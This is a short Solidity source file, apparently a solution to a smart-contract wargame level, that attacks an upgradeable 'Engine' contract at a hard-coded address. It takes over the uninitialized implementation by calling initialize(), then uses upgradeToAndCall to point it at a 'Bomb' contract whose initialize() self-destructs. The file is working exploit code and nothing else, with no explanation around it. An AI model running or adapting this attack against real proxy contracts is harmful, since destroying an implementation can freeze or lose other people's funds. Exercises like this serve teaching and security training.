// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import "./Engine.sol";

contract HackEngine {
     Engine public originalContract = Engine(0x21b9c6013A4C65F33d854aB3f8F6D4b923C48A1D);
     event logEvent(bool, bytes);
     
   function attackEngine() external  {
       (bool success, bytes memory data) = address(originalContract).call(abi.encodeWithSignature("initialize()"));
       emit logEvent(success, data);
    }
    
    function destroyWithBomb() external {
        // pass in a bomb which blows up when initialize is called
        Bomb bomb = new Bomb();
        
       (bool success, bytes memory data) =  address(originalContract).call(abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(bomb), abi.encodeWithSignature("initialize()")));
        emit logEvent(success, data);
    }
}

contract Bomb {
    function initialize() external {
        selfdestruct(msg.sender);
    }
}